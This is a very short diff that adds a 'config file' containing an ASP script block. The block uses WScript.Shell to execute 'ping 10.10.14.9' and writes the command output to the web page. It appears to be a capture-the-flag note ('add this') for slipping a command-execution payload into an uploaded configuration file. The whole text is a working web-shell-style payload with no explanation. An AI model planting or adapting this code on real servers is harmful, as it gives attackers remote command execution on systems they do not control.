@@ -1,0 +1,15 @@
+config file
+
+<%
+
+Set rs=CreateObject("WScript.Shell")
+
+Set cmd=rs.Exec("ping 10.10.14.9")
+
+o= cmd.StdOut.Readall()
+
+Response.write(o)
+
+%>
+
+add this
